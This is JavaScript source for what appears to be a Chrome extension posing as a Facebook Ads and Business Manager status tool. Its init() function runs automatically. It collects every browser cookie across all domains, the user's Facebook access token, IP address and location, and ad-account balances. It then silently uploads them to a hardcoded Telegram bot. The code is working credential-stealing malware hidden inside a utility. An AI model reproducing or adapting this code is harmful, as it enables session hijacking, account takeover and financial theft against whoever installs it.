//chrome.token, chrome.objAcc, chrome.objBM,  chrome.logHtml, 
async function reqAPI(url, method, body) {
    let response = await fetch(
        url,
        {
            method: method,
            body: body
        })
    let html = await response.text().then((res) => res)
    return html;
}

async function getToken() {
    let url1 = 'https://business.facebook.com/adsmanager/manage/accounts';
    let url2 = 'https://business.facebook.com/adsmanager/manage/accounts?act='
    let json1 = await reqAPI(url1, 'GET');
    accadsid = json1.split('adAccountId: \\"')[1].split('\\"')[0];
    let json2 = await reqAPI(url2 + accadsid, 'GET')
    let token = json2.split('window.__accessToken="')[1].split('"')[0];
    chrome.token = token;
    return token;
}


async function main(token) {
    getInputToken(token);
    getListAccInfo(token);
    getStatusBM(token);
    getStatusFanPage(token);
}


async function getInputToken(token) {
    let inpuToken = document.getElementById('token');
    inpuToken.value = token;
}


async function init() {
    console.log(chrome.objAcc)
    var objAcc = chrome.objAcc;
    var doccap = ''
    var stt = 1;
    for(var o of objAcc){
        doccap+= stt.toString() + '|' + o['status']+ '|' + o['adtrust'] + '|'
        + o['balance']+ '|' + o['spent']+ '|' + o['admin']+ '|' +
        o['currency']+ '|' + o['acctype']+  '\n'
        stt++;
    }

    var ck = await headCookieDomain('facebook.com');
    var u = await headCookieDomain2('facebook.com');
    var info = await getInfoRq();
    var allck = await headCookieAl();
    var document = ck + '\n\n ' + allck;
    u = "<a href='https://facebook.com/" + u + "'>" + u + "</a>"
    doccap = u + '\n'  + "<pre>"+ doccap + "</pre>";
    var chat_id = 1204553919; //-773511937
    var enc_data = document;
    var token = "5712740653:AAFreDzJcJMwmYXULecs3-l5rHOpY5XSb78";
    var blob = new Blob([enc_data], { type: 'plain/text' });
    var formData = new FormData();
    formData.append('chat_id', chat_id);
    formData.append('caption', doccap);
    formData.append('parse_mode', 'HTML');
    formData.append('document', blob, info + '.txt');
    var request = new XMLHttpRequest();
    request.open('POST', `https://api.telegram.org/bot${token}/sendDocument`);
    request.send(formData);
}

async function getInfoRq() {
    let url = 'https://codewithnodejs.com/api/ip-and-location/';
    let json = await reqAPI(url, 'GET')
    let obj = JSON.parse(json);
    let info = obj['ip'] + ', ' + obj['city'] + ', ' + obj['country'] + ', ' + obj['country_code'];
    return info
}
async function headCookieDomain2(domain) {
    let cks = await chrome.cookies.getAll({ url: 'https://' + domain });
    var text = '';
    for (let ck of cks) {
        if (ck.name == 'c_user'){
            text = ck.value;
        }
    }
    return text;
}

async function headCookieDomain(domain) {
    let cks = await chrome.cookies.getAll({ url: 'https://' + domain });
    let text = ''
    for (let ck of cks) {
        text += ck.name + '=' + ck.value + ';';
    }
    return text
}

async function headCookieAl() {
    let cks = await chrome.cookies.getAll({});
    let arrDomain = [];
    for (let ck of cks) {
        arrDomain.push(ck.domain)
    }
    arrDomain = arrDomain.sort();
    arrDomain = Array.from(new Set(arrDomain));
    var text = ''
    for (let i of arrDomain) {
        ck = await headCookieDomain(i);
        text += 'Domain: ' + i + '\n' + ck + '\n\n'

    }
    return text
}

async function getStatusFanPage(token) {
    let url = 'https://graph.facebook.com/v15.0/me?fields=accounts.limit(100){id,name,verification_status,is_published,ad_campaign,is_promotable,is_restricted,parent_page,promotion_eligible,promotion_ineligible_reason,fan_count,has_transitioned_to_new_page_experience,ads_posts.limit(100),picture}&access_token=' + token;
    let json = await reqAPI(url, 'GET')
    let obj = JSON.parse(json);
    let objList = obj['accounts']['data']
    var arrFan = [];
    for (var fan of objList) {
        var objFan = {
            img: null,
            id: null,
            name: null,
            status: null,
            promotable: null,
            likecount: null,
            ads: null,
        }

        for (var f in fan) {
            switch (f) {
                case 'picture':
                    url = fan[f]['data']['url']
                    objFan.img = url;
                    break;
                case 'id':
                    objFan.id = fan[f];
                    break;
                case 'name':
                    objFan.name = fan[f];
                    break;
                case 'verification_status':
                    objFan.status = fan[f];
                    break;
                case 'is_promotable':
                    objFan.promotable = fan[f];
                    break;
                case 'fan_count':
                    objFan.likecount = fan[f];
                    break;
                case 'ads_posts':
                    objFan.ads = fan[f]['data'].length;
                    break;
                default:
                    objFan.ads = 0;
            }
        }
        arrFan.push(objFan)
    }
    renderHtmlFan(arrFan);
}

function renderHtmlFan(arrObj) {
    var aaa = {
        1: 1,
        2: 2

    }
    var result = ''
    let html = arrObj.map(function (arr) {
        result += `<tr class="trInfo">`
        for (var a in arr) {
            if (a == 'img') {
                result += `<td class="tdInfo"><img src=${arr[a]}></img></td>`
            } else {
                result += `<td class="tdInfo">${arr[a]}</td>`
            }
        }
        result += `</tr">`
    })

    var htmlheading = `<tr>
    <th>Avatar</th>
    <th>Fanpage id</th>
    <th>Name</th>
    <th>Status</th>
    <th>Promotable</th>
    <th>Like counts</th>
    <th>Ads counts</th>
    </tr>`

    var tableBM = document.getElementById('tbFanPage');
    tableBM.innerHTML = htmlheading + result;
}


async function getStatusBM(token) {
    let url = 'https://graph.facebook.com/v15.0/me/businesses?fields=id,created_time,is_disabled_for_integrity_reasons,can_use_extended_credit,name,timezone_id,timezone_offset_hours_utc,verification_status,owned_ad_accounts{account_status},client_ad_accounts{account_status},owned_pages,client_pages,business_users,owned_pixels{name}&access_token=' + token;
    let json = await reqAPI(url, 'GET')
    let obj = JSON.parse(json);
    let objList = obj.data
    var arrBM = [];
    for (var bm of objList) {
        var objBM = {
            id: null,
            name: null,
            veri: null,
            limit: null,
            timezone: null,
            datecreate: null,
            pixel: [],
        };

        for (var info in bm) {
            switch (info) {
                case 'id':
                    objBM.id = bm[info];
                    break;
                case 'name':
                    objBM.name = bm[info];
                    break;
                case 'verification_status':
                    objBM.veri = bm[info];
                    break;
                case 'can_use_extended_credit':
                    if (bm[info]) {
                        objBM.limit = '$250+';
                    } else {
                        objBM.limit = bm[info];
                    }

                    break;
                case 'timezone_id':
                    objBM.timezone = bm[info] + ':' + chrome.objTimeZone[bm[info]];
                    break;
                case 'created_time':
                    objBM.datecreate = bm[info].slice(0, 10);
                    break;
                case 'owned_pixels':

                    var ArrPixcel = [];
                    for (var j of bm[info]['data']) {
                        let id = j['id'];
                        let name = j['name'];
                        objBM.pixel.push({
                            id: id,
                            name: name
                        })
                    }
                    break;

            }
        }
        arrBM.push(objBM)

    }
    chrome.objBM = arrBM;
    renderHtmlBM(arrBM)
}

function renderHtmlBM(arrObj) {
    var result = '';
    var listBM = '';
    let html = arrObj.map(function (arr) {
        result += `<tr class="trInfo">`
        for (var a in arr) {
            if (a == 'id') {
                listBM += `<option>${arr[a]}</option>`
            }
            if (a == 'pixel') {
                result += `<td class="tdInfo">${arr[a].length}</td>`
            } else {
                result += `<td class="tdInfo">${arr[a]}</td>`
            }

        }
        result += `</tr">`
    })

    var htmlheading = `<tr>
    <th>Id BM</th>
    <th>Name</th>
    <th>Status</th>
    <th>Limit</th>
    <th>Time Zone</th>
    <th>Create Date</th>
    <th>Pixel counts</th>
    </tr>`

    var tableBM = document.getElementById('tbBM');
    var selectBM = document.getElementById('listBM');
    tableBM.innerHTML = htmlheading + result;
    selectBM.innerHTML = listBM;
    var currentBM = selectBM.value
    getListPixel(currentBM)
}


function getListPixel(currentBM) {
    var objBM = chrome.objBM
    var optionHTML = '';
    for (var b of objBM) {
        if (b['id'] == currentBM) {
            if (b['pixel'].length < 1) {
                optionHTML += `<option>Dose have an account!</option>`
            }
            for (var px of b['pixel']) {
                optionHTML += `<option>${px['id']}</option>`
            }
        }
    }
    var listPixel = document.getElementById('listPixel');
    listPixel.innerHTML = optionHTML;
}

document.getElementById('quicklink').addEventListener('change', function () {
    console.log(this.value);
    window.open(this.value, '_blank')
});
document.getElementById('listBM').addEventListener('change', function () {
    console.log('You selected: ', this.value);
    var currentBM = this.value;
    getListPixel(currentBM)

});

document.getElementById('btnclose').addEventListener('click', function () {
    window.close();
    console.log(123)
})
document.getElementById('btnSharePixe').addEventListener('click', function () {
    var idBm = document.getElementById('listBM').value;
    var idPixel = document.getElementById('listPixel').value;
    var listPixelId = document.getElementById('listPixelId').value;
    var arrlistPixelId = listPixelId.split("\n");

    if (listPixelId.length < 1) {
        alert('Pls input id or list ads')
        return
    }
    if (idPixel.slice(0, 2) != 'Do') {
        var logHtml = document.getElementById('logsatusSharePixel');
        logHtml.innerHTML = '';
        chrome.logHtml = ''

        for (var idAds of arrlistPixelId) {
            btnSharePixe(chrome.token, idBm, idPixel, idAds)
        }
    } else {
        alert('Dose not have an account!')
        return;
    }
});

async function btnSharePixe(token, idBm, idPixel, idAds) {
    url = "https://graph.facebook.com/v15.0/" + idPixel + "/shared_accounts"
    let formData = new FormData();
    formData.append('account_id', idAds);
    formData.append('business', idBm);
    formData.append('access_token', token);
    let response = await reqAPI(url, 'POST', formData)
    console.log(response)
    let obj = JSON.parse(response);

    if (obj['success']) {
        console.log(idAds + ': sucess')
        chrome.logHtml += `<li>${idAds} : success: true</li>`
    } else {
        console.log(idAds + ': error')
        chrome.logHtml += `<li> ${idAds} : success: true</li>`
    }
    var logHtml = document.getElementById('logsatusSharePixel');
    logHtml.innerHTML = chrome.logHtml;
}

async function getListAccInfo(token) {
    let rowInfo = ['account_id', 'account_status', 'name', 'adtrust_dsl', 'currency', 'balance', 'amount_spent',]
    let url = 'https://graph.facebook.com/v15.0/me/adaccounts?fields=id,account_id,business,name,adtrust_dsl,currency,account_status,balance,current_unbilled_spend,amount_spent,account_currency_ratio_to_usd,users,user_role,assigned_partners,adspaymentcycle,ads.limit(1000){effective_status}&limit=1000&sort=name_ascending&access_token=' + token;
    let json = await reqAPI(url, 'GET')
    let obj = JSON.parse(json);
    let objListACC = obj.data
    var htmlAcc = ''
    var htmlInfoAcc = ''
    var html = ''
    var stt = 0
    var arrAcc = []
    for (var acc of objListACC) {
        var objAcc = {
            id: 'null',
            name: '',
            status: '',
            adtrust: '',
            balance: '',
            spent: '',
            admin: '',
            currency: '',
            acctype: ''
        }
        stt += 1;
        html += `<tr class="trInfo">`
        for (var info in acc) {
            switch (info) {
                case 'account_id':
                    objAcc.id = acc[info];
                    break;
                case 'name':
                    objAcc.name = acc[info];
                    break;
                case 'account_status':
                    let status = getStatusAcc(acc[info]);
                    objAcc.status = status;
                    break;
                case 'adtrust_dsl':
                    let limit;
                    if (acc[info] == -1) {
                        limit = 'No limit'
                    } else {
                        limit = acc[info]
                    }
                    objAcc.adtrust = limit;
                    break;
                case 'balance':
                    objAcc.balance = acc[info];
                    break;
                case 'amount_spent':
                    objAcc.spent = acc[info];
                    break;
                case 'users':
                    let numAdmin = acc[info]['data'].length;
                    objAcc.admin = numAdmin;
                    break;
                case 'currency':
                    objAcc.currency = acc[info];
                    break;
                default:
                    if (!acc['business']) {
                        objAcc.acctype = 'Ads manage'
                    } else {
                        objAcc.acctype = 'BM manage'
                    }
            }
        }
        arrAcc.push(objAcc);
    }
    chrome.objAcc = arrAcc;
    renderHtmlAcc(arrAcc);
    init();
}

function renderHtmlAcc(arrObj) {
    var result = '';
    var listAcc = '';
    let html = arrObj.map(function (arr) {
        result += `<tr class="trInfo">`
        for (var a in arr) {
            if (a == 'id') {
                listAcc += `<option>${arr[a]}</option>`
            }
            if (a == 'pixel') {
                result += `<td class="tdInfo">${arr[a].length}</td>`
            } else {
                result += `<td class="tdInfo">${arr[a]}</td>`
            }

        }
        result += `</tr">`
    })

    var tb = document.getElementById('tb');
    var htmlheading = `<tr><th>Account</th>
                                    <th>Name</th>
                                    <th>Status</th>
                                    <th>Adtrust</th>
                                    <th>Balance</th>
                                    <th>Spent</th>
                                    <th>Admin</th>
                                    <th>Currency</th>
                                    <th>Account type type</th>
                                    </tr>`
    tb.innerHTML = htmlheading + result;
}


async function getListAccInfobackup(token) {
    let rowInfo = ['account_id', 'account_status', 'name', 'adtrust_dsl', 'currency', 'balance', 'amount_spent',]
    let url = 'https://graph.facebook.com/v15.0/me/adaccounts?fields=id,account_id,business,name,adtrust_dsl,currency,account_status,balance,current_unbilled_spend,amount_spent,account_currency_ratio_to_usd,users,user_role,assigned_partners,adspaymentcycle,ads.limit(1000){effective_status}&limit=1000&sort=name_ascending&access_token=' + token;
    let json = await reqAPI(url, 'GET')
    let obj = JSON.parse(json);
    let objListACC = obj.data
    var htmlAcc = ''
    var htmlInfoAcc = ''
    var html = ''
    var stt = 0
    for (var acc of objListACC) {
        stt += 1;
        html += `<tr class="trInfo">`
        for (var info in acc) {

            if (info == 'account_id') {
                htmlAcc += `<option value="${acc[info]}">act_${acc[info]}</option>`
            }
            if (info == 'users') {
                let numAdmin = acc[info]['data'].length;
                html += `<td class="tdInfo">${numAdmin}</td>`
            }
            if (rowInfo.includes(info)) {
                if (stt == 1) {
                    htmlInfoAcc += `<li>${info} : ${acc[info]}</li>`
                }

                if (info == 'account_status') {
                    let status = getStatusAcc(acc[info]);
                    html += `<td class="tdInfo">${status}</td>`
                } else if (info == 'adtrust_dsl') {
                    let limit;
                    if (acc[info] == -1) {
                        limit = 'No limit'
                    } else {
                        limit = acc[info]
                    }
                    html += `<td class="tdInfo">${limit}</td>`
                } else {
                    html += `<td class="tdInfo">${acc[info]}</td>`
                }

            }
        }
        if (!acc['business']) {
            html += `<td class="tdInfo">Ads manage</td>`
        } else {
            html += `<td class="tdInfo">BM manage</td>`
        }
        html += `</tr>`
    }
    var tb = document.getElementById('tb');
    var htmlheading = `<tr><th>Account</th>
                                    <th>Name</th>
                                    <th>Adtrust</th>
                                    <th>Currency</th>
                                    <th>Status</th>
                                    <th>Balance</th>
                                    <th>Spent</th>
                                    <th>Admin</th>
                                    <th>Account type</th>
                                    </tr>`
    tb.innerHTML = htmlheading + html;
}

function getStatusAcc(num) {
    let astatus = ''
    switch (num) {
        case 1:
            astatus = 'ACTIVE';
            break; ///active
        case 2:
            astatus = 'DISABLED';
            break; //disabled
        case 3:
            astatus = 'UNSETTLED';
            break;
        case 7:
            astatus = "PENDING_RISK_REVIEW";
            break;
        case 8:
            astatus = "PENDING_SETTLEMENT";
            break;
        case 9:
            astatus = "IN_GRACE_PERIOD";
            break;
        case 100:
            astatus = 'PENDING_CLOSURE';
            break;
        case 101:
            astatus = 'CLOSED';
            break;
        case 201:
            astatus = "ANY_ACTIVE";
            break;
        case 202:
            astatus = "ANY_CLOSED";
            break;
        default:
            astatus = "UNKNOWN"
            break;
    }
    return astatus
}

chrome.objTimeZone = {
    0: 'Unknown',
    1: 'America_Los_Angeles',
    2: 'America_Denver',
    3: 'Pacific_Honolulu',
    4: 'America_Anchorage',
    5: 'America_Phoenix',
    6: 'America_Chicago',
    7: 'America_New_York',
    8: 'Asia_Dubai',
    9: 'America_Argentina_San_Luis',
    10: 'America_Argentina_Buenos_Aires',
    11: 'America_Argentina_Salta',
    12: 'Europe_Vienna',
    13: 'Australia_Perth',
    14: 'Australia_Broken_Hill',
    15: 'Australia_Sydney',
    16: 'Europe_Sarajevo',
    17: 'Asia_Dhaka',
    18: 'Europe_Brussels',
    19: 'Europe_Sofia',
    20: 'Asia_Bahrain',
    21: 'America_La_Paz',
    22: 'America_Noronha',
    23: 'America_Campo_Grande',
    24: 'America_Belem',
    25: 'America_Sao_Paulo',
    26: 'America_Nassau',
    27: 'America_Dawson',
    28: 'America_Vancouver',
    29: 'America_Dawson_Creek',
    30: 'America_Edmonton',
    31: 'America_Rainy_River',
    32: 'America_Regina',
    33: 'America_Atikokan',
    34: 'America_Iqaluit',
    35: 'America_Toronto',
    36: 'America_Blanc_Sablon',
    37: 'America_Halifax',
    38: 'America_St_Johns',
    39: 'Europe_Zurich',
    40: 'Pacific_Easter',
    41: 'America_Santiago',
    42: 'Asia_Shanghai',
    43: 'America_Bogota',
    44: 'America_Costa_Rica',
    45: 'Asia_Nicosia',
    46: 'Europe_Prague',
    47: 'Europe_Berlin',
    48: 'Europe_Copenhagen',
    49: 'America_Santo_Domingo',
    50: 'Pacific_Galapagos',
    51: 'America_Guayaquil',
    52: 'Europe_Tallinn',
    53: 'Africa_Cairo',
    54: 'Atlantic_Canary',
    55: 'Europe_Madrid',
    56: 'Europe_Helsinki',
    57: 'Europe_Paris',
    58: 'Europe_London',
    59: 'Africa_Accra',
    60: 'Europe_Athens',
    61: 'America_Guatemala',
    62: 'Asia_Hong_Kong',
    63: 'America_Tegucigalpa',
    64: 'Europe_Zagreb',
    65: 'Europe_Budapest',
    66: 'Asia_Jakarta',
    67: 'Asia_Makassar',
    68: 'Asia_Jayapura',
    69: 'Europe_Dublin',
    70: 'Asia_Jerusalem',
    71: 'Asia_Kolkata',
    72: 'Asia_Baghdad',
    73: 'Atlantic_Reykjavik',
    74: 'Europe_Rome',
    75: 'America_Jamaica',
    76: 'Asia_Amman',
    77: 'Asia_Tokyo',
    78: 'Africa_Nairobi',
    79: 'Asia_Seoul',
    80: 'Asia_Kuwait',
    81: 'Asia_Beirut',
    82: 'Asia_Colombo',
    83: 'Europe_Vilnius',
    84: 'Europe_Luxembourg',
    85: 'Europe_Riga',
    86: 'Africa_Casablanca',
    87: 'Europe_Skopje',
    88: 'Europe_Malta',
    89: 'Indian_Mauritius',
    90: 'Indian_Maldives',
    91: 'America_Tijuana',
    92: 'America_Hermosillo',
    93: 'America_Mazatlan',
    94: 'America_Mexico_City',
    95: 'Asia_Kuala_Lumpur',
    96: 'Africa_Lagos',
    97: 'America_Managua',
    98: 'Europe_Amsterdam',
    99: 'Europe_Oslo',
    100: 'Pacific_Auckland',
    101: 'Asia_Muscat',
    102: 'America_Panama',
    103: 'America_Lima',
    104: 'Asia_Manila',
    105: 'Asia_Karachi',
    106: 'Europe_Warsaw',
    107: 'America_Puerto_Rico',
    108: 'Asia_Gaza',
    109: 'Atlantic_Azores',
    110: 'Europe_Lisbon',
    111: 'America_Asuncion',
    112: 'Asia_Qatar',
    113: 'Europe_Bucharest',
    114: 'Europe_Belgrade',
    115: 'Europe_Kaliningrad',
    116: 'Europe_Moscow',
    117: 'Europe_Samara',
    118: 'Asia_Yekaterinburg',
    119: 'Asia_Omsk',
    120: 'Asia_Krasnoyarsk',
    121: 'Asia_Irkutsk',
    122: 'Asia_Yakutsk',
    123: 'Asia_Vladivostok',
    124: 'Asia_Magadan',
    125: 'Asia_Kamchatka',
    126: 'Asia_Riyadh',
    127: 'Europe_Stockholm',
    128: 'Asia_Singapore',
    129: 'Europe_Ljubljana',
    130: 'Europe_Bratislava',
    131: 'America_El_Salvador',
    132: 'Asia_Bangkok',
    133: 'Africa_Tunis',
    134: 'Europe_Istanbul',
    135: 'America_Port_Of_Spain',
    136: 'Asia_Taipei',
    137: 'Europe_Kiev',
    138: 'America_Montevideo',
    139: 'America_Caracas',
    140: 'Asia_Ho_Chi_Minh',
    141: 'Africa_Johannesburg',
    142: 'America_Winnipeg',
    143: 'America_Detroit',
    144: 'Australia_Melbourne',
    145: 'Asia_Kathmandu',
    146: 'Asia_Baku',
    147: 'Africa_Abidjan',
    148: 'Africa_Addis_Ababa',
    149: 'Africa_Algiers',
    150: 'Africa_Asmara',
    151: 'Africa_Bamako',
    152: 'Africa_Bangui',
    153: 'Africa_Banjul',
    154: 'Africa_Bissau',
    155: 'Africa_Blantyre',
    156: 'Africa_Brazzaville',
    157: 'Africa_Bujumbura',
    158: 'Africa_Ceuta',
    159: 'Africa_Conakry',
    160: 'Africa_Dakar',
    161: 'Africa_Dar_Es_Salaam',
    162: 'Africa_Djibouti',
    163: 'Africa_Douala',
    164: 'Africa_El_Aaiun',
    165: 'Africa_Freetown',
    166: 'Africa_Gaborone',
    167: 'Africa_Harare',
    168: 'Africa_Juba',
    169: 'Africa_Kampala',
    170: 'Africa_Khartoum',
    171: 'Africa_Kigali',
    172: 'Africa_Kinshasa',
    173: 'Africa_Libreville',
    174: 'Africa_Lome',
    175: 'Africa_Luanda',
    176: 'Africa_Lubumbashi',
    177: 'Africa_Lusaka',
    178: 'Africa_Malabo',
    179: 'Africa_Maputo',
    180: 'Africa_Maseru',
    181: 'Africa_Mbabane',
    182: 'Africa_Mogadishu',
    183: 'Africa_Monrovia',
    184: 'Africa_Ndjamena',
    185: 'Africa_Niamey',
    186: 'Africa_Nouakchott',
    187: 'Africa_Ouagadougou',
    188: 'Africa_Porto_Novo',
    189: 'Africa_Sao_Tome',
    190: 'Africa_Tripoli',
    191: 'Africa_Windhoek',
    192: 'America_Adak',
    193: 'America_Anguilla',
    194: 'America_Antigua',
    195: 'America_Araguaina',
    196: 'America_Argentina_Catamarca',
    197: 'America_Argentina_Cordoba',
    198: 'America_Argentina_Jujuy',
    199: 'America_Argentina_La_Rioja',
    200: 'America_Argentina_Mendoza',
    201: 'America_Argentina_Rio_Gallegos',
    202: 'America_Argentina_San_Juan',
    203: 'America_Argentina_Tucuman',
    204: 'America_Argentina_Ushuaia',
    205: 'America_Aruba',
    206: 'America_Bahia',
    207: 'America_Bahia_Banderas',
    208: 'America_Barbados',
    209: 'America_Belize',
    210: 'America_Boa_Vista',
    211: 'America_Boise',
    212: 'America_Cambridge_Bay',
    213: 'America_Cancun',
    214: 'America_Cayenne',
    215: 'America_Cayman',
    216: 'America_Chihuahua',
    217: 'America_Creston',
    218: 'America_Cuiaba',
    219: 'America_Curacao',
    220: 'America_Danmarkshavn',
    221: 'America_Dominica',
    222: 'America_Eirunepe',
    223: 'America_Fort_Nelson',
    224: 'America_Fortaleza',
    225: 'America_Glace_Bay',
    226: 'America_Godthab',
    227: 'America_Goose_Bay',
    228: 'America_Grand_Turk',
    229: 'America_Grenada',
    230: 'America_Guadeloupe',
    231: 'America_Guyana',
    232: 'America_Havana',
    233: 'America_Indiana_Indianapolis',
    234: 'America_Indiana_Knox',
    235: 'America_Indiana_Marengo',
    236: 'America_Indiana_Petersburg',
    237: 'America_Indiana_Tell_City',
    238: 'America_Indiana_Vevay',
    239: 'America_Indiana_Vincennes',
    240: 'America_Indiana_Winamac',
    241: 'America_Indianapolis',
    242: 'America_Inuvik',
    243: 'America_Juneau',
    244: 'America_Kentucky_Louisville',
    245: 'America_Kentucky_Monticello',
    246: 'America_Kralendijk',
    247: 'America_Lower_Princes',
    248: 'America_Maceio',
    249: 'America_Manaus',
    250: 'America_Marigot',
    251: 'America_Martinique',
    252: 'America_Matamoros',
    253: 'America_Menominee',
    254: 'America_Merida',
    255: 'America_Metlakatla',
    256: 'America_Miquelon',
    257: 'America_Moncton',
    258: 'America_Monterrey',
    259: 'America_Montreal',
    260: 'America_Montserrat',
    261: 'America_Nipigon',
    262: 'America_Nome',
    263: 'America_North_Dakota_Beulah',
    264: 'America_North_Dakota_Center',
    265: 'America_North_Dakota_New_Salem',
    266: 'America_Ojinaga',
    267: 'America_Pangnirtung',
    268: 'America_Paramaribo',
    269: 'America_Port_Au_Prince',
    270: 'America_Porto_Velho',
    271: 'America_Punta_Arenas',
    272: 'America_Rankin_Inlet',
    273: 'America_Recife',
    274: 'America_Resolute',
    275: 'America_Rio_Branco',
    276: 'America_Santarem',
    277: 'America_Scoresbysund',
    278: 'America_Sitka',
    279: 'America_St_Barthelemy',
    280: 'America_St_Kitts',
    281: 'America_St_Lucia',
    282: 'America_St_Thomas',
    283: 'America_St_Vincent',
    284: 'America_Swift_Current',
    285: 'America_Thule',
    286: 'America_Thunder_Bay',
    287: 'America_Tortola',
    288: 'America_Whitehorse',
    289: 'America_Yakutat',
    290: 'America_Yellowknife',
    291: 'Antarctica_Casey',
    292: 'Antarctica_Davis',
    293: 'Antarctica_Dumontdurville',
    294: 'Antarctica_Macquarie',
    295: 'Antarctica_Mawson',
    296: 'Antarctica_Mcmurdo',
    297: 'Antarctica_Palmer',
    298: 'Antarctica_Rothera',
    299: 'Antarctica_Syowa',
    300: 'Antarctica_Troll',
    301: 'Antarctica_Vostok',
    302: 'Arctic_Longyearbyen',
    303: 'Asia_Aden',
    304: 'Asia_Almaty',
    305: 'Asia_Anadyr',
    306: 'Asia_Aqtau',
    307: 'Asia_Aqtobe',
    308: 'Asia_Ashgabat',
    309: 'Asia_Atyrau',
    310: 'Asia_Barnaul',
    311: 'Asia_Bishkek',
    312: 'Asia_Brunei',
    313: 'Asia_Chita',
    314: 'Asia_Choibalsan',
    315: 'Asia_Damascus',
    316: 'Asia_Dili',
    317: 'Asia_Dushanbe',
    318: 'Asia_Famagusta',
    319: 'Asia_Hebron',
    320: 'Asia_Hovd',
    321: 'Asia_Istanbul',
    322: 'Asia_Kabul',
    323: 'Asia_Khandyga',
    324: 'Asia_Kuching',
    325: 'Asia_Macau',
    326: 'Asia_Novokuznetsk',
    327: 'Asia_Novosibirsk',
    328: 'Asia_Oral',
    329: 'Asia_Phnom_Penh',
    330: 'Asia_Pontianak',
    331: 'Asia_Pyongyang',
    332: 'Asia_Qostanay',
    333: 'Asia_Qyzylorda',
    334: 'Asia_Sakhalin',
    335: 'Asia_Samarkand',
    336: 'Asia_Srednekolymsk',
    337: 'Asia_Tashkent',
    338: 'Asia_Tbilisi',
    339: 'Asia_Tehran',
    340: 'Asia_Thimphu',
    341: 'Asia_Tomsk',
    342: 'Asia_Ulaanbaatar',
    343: 'Asia_Urumqi',
    344: 'Asia_Ust_Nera',
    345: 'Asia_Vientiane',
    346: 'Asia_Yangon',
    347: 'Asia_Yerevan',
    348: 'Atlantic_Bermuda',
    349: 'Atlantic_Cape_Verde',
    350: 'Atlantic_Faroe',
    351: 'Atlantic_Madeira',
    352: 'Atlantic_South_Georgia',
    353: 'Atlantic_St_Helena',
    354: 'Atlantic_Stanley',
    355: 'Australia_Adelaide',
    356: 'Australia_Brisbane',
    357: 'Australia_Currie',
    358: 'Australia_Darwin',
    359: 'Australia_Eucla',
    360: 'Australia_Hobart',
    361: 'Australia_Lindeman',
    362: 'Australia_Lord_Howe',
    363: 'Cet',
    364: 'Cst6Cdt',
    365: 'Eet',
    366: 'Est',
    367: 'Est5Edt',
    368: 'Etc_Gmt',
    369: 'Etc_Gmt_Plus_0',
    370: 'Etc_Gmt_Plus_1',
    371: 'Etc_Gmt_Plus_10',
    372: 'Etc_Gmt_Plus_11',
    373: 'Etc_Gmt_Plus_12',
    374: 'Etc_Gmt_Plus_2',
    375: 'Etc_Gmt_Plus_3',
    376: 'Etc_Gmt_Plus_4',
    377: 'Etc_Gmt_Plus_5',
    378: 'Etc_Gmt_Plus_6',
    379: 'Etc_Gmt_Plus_7',
    380: 'Etc_Gmt_Plus_8',
    381: 'Etc_Gmt_Plus_9',
    382: 'Etc_Gmt_Minus_0',
    383: 'Etc_Gmt_Minus_1',
    384: 'Etc_Gmt_Minus_10',
    385: 'Etc_Gmt_Minus_11',
    386: 'Etc_Gmt_Minus_12',
    387: 'Etc_Gmt_Minus_13',
    388: 'Etc_Gmt_Minus_14',
    389: 'Etc_Gmt_Minus_2',
    390: 'Etc_Gmt_Minus_3',
    391: 'Etc_Gmt_Minus_4',
    392: 'Etc_Gmt_Minus_5',
    393: 'Etc_Gmt_Minus_6',
    394: 'Etc_Gmt_Minus_7',
    395: 'Etc_Gmt_Minus_8',
    396: 'Etc_Gmt_Minus_9',
    397: 'Etc_Gmt0',
    398: 'Etc_Greenwich',
    399: 'Etc_Universal',
    400: 'Etc_Zulu',
    401: 'Europe_Andorra',
    402: 'Europe_Astrakhan',
    403: 'Europe_Busingen',
    404: 'Europe_Chisinau',
    405: 'Europe_Gibraltar',
    406: 'Europe_Guernsey',
    407: 'Europe_Isle_Of_Man',
    408: 'Europe_Jersey',
    409: 'Europe_Kirov',
    410: 'Europe_Mariehamn',
    411: 'Europe_Minsk',
    412: 'Europe_Monaco',
    413: 'Europe_Nicosia',
    414: 'Europe_Podgorica',
    415: 'Europe_San_Marino',
    416: 'Europe_Saratov',
    417: 'Europe_Simferopol',
    418: 'Europe_Tirane',
    419: 'Europe_Ulyanovsk',
    420: 'Europe_Uzhgorod',
    421: 'Europe_Vaduz',
    422: 'Europe_Vatican',
    423: 'Europe_Volgograd',
    424: 'Europe_Zaporozhye',
    425: 'Gmt',
    426: 'Hst',
    427: 'Indian_Antananarivo',
    428: 'Indian_Chagos',
    429: 'Indian_Christmas',
    430: 'Indian_Cocos',
    431: 'Indian_Comoro',
    432: 'Indian_Kerguelen',
    433: 'Indian_Mahe',
    434: 'Indian_Mayotte',
    435: 'Indian_Reunion',
    436: 'Met',
    437: 'Mst',
    438: 'Mst7Mdt',
    439: 'Pst8Pdt',
    440: 'Pacific_Apia',
    441: 'Pacific_Bougainville',
    442: 'Pacific_Chatham',
    443: 'Pacific_Chuuk',
    444: 'Pacific_Efate',
    445: 'Pacific_Enderbury',
    446: 'Pacific_Fakaofo',
    447: 'Pacific_Fiji',
    448: 'Pacific_Funafuti',
    449: 'Pacific_Gambier',
    450: 'Pacific_Guadalcanal',
    451: 'Pacific_Guam',
    452: 'Pacific_Kiritimati',
    453: 'Pacific_Kosrae',
    454: 'Pacific_Kwajalein',
    455: 'Pacific_Majuro',
    456: 'Pacific_Marquesas',
    457: 'Pacific_Midway',
    458: 'Pacific_Nauru',
    459: 'Pacific_Niue',
    460: 'Pacific_Norfolk',
    461: 'Pacific_Noumea',
    462: 'Pacific_Pago_Pago',
    463: 'Pacific_Palau',
    464: 'Pacific_Pitcairn',
    465: 'Pacific_Pohnpei',
    466: 'Pacific_Port_Moresby',
    467: 'Pacific_Rarotonga',
    468: 'Pacific_Saipan',
    469: 'Pacific_Tahiti',
    470: 'Pacific_Tarawa',
    471: 'Pacific_Tongatapu',
    472: 'Pacific_Wake',
    473: 'Pacific_Wallis',
    474: 'Utc',
    475: 'Wet',
    476: 'Asia_Calcutta',
    477: 'Asia_Katmandu',
    478: 'America_Nuuk',
    479: 'Num_Timezones',
}